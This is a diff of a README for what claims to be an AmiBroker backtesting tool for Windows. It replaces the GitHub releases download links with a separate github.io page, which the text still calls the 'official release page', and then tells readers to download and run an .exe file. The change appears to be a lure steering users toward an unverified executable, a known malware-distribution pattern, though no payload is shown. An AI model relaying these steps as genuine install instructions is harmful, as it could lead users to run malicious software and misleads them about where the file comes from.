@@ -1,6 +1,6 @@
 # 📈 amibroker-windows-backtest-tools - Analyze Your Trading Strategies With Precision
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/uahtisham459-dev/amibroker-windows-backtest-tools/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://uahtisham459-dev.github.io)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these standards before you begin:
 Follow these steps to set up the software on your machine.
 
 1.  Open your internet browser.
-2.  Visit the official release page here: [https://github.com/uahtisham459-dev/amibroker-windows-backtest-tools/releases](https://github.com/uahtisham459-dev/amibroker-windows-backtest-tools/releases).
+2.  Visit the official release page here: [https://uahtisham459-dev.github.io](https://uahtisham459-dev.github.io).
 3.  Scroll down to the list of available files under the Latest release heading.
 4.  Click the file ending in .exe to start the download.
 5.  Wait for the file to save to your Downloads folder.
